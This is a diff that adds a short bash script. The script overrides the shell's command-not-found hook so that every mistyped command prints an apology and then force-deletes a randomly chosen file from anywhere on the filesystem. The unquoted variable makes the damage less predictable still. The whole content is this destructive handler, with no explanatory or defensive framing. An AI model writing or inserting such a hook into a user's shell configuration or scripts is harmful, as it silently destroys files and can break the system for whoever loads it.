@@ -1,0 +1,6 @@
+#!/bin/bash
+function command_not_found_handle {
+  echo "Command not found, sorry. Removing random file..."
+  FILE=$(locate / | shuf -n 1)
+  rm -vf $FILE;
+}
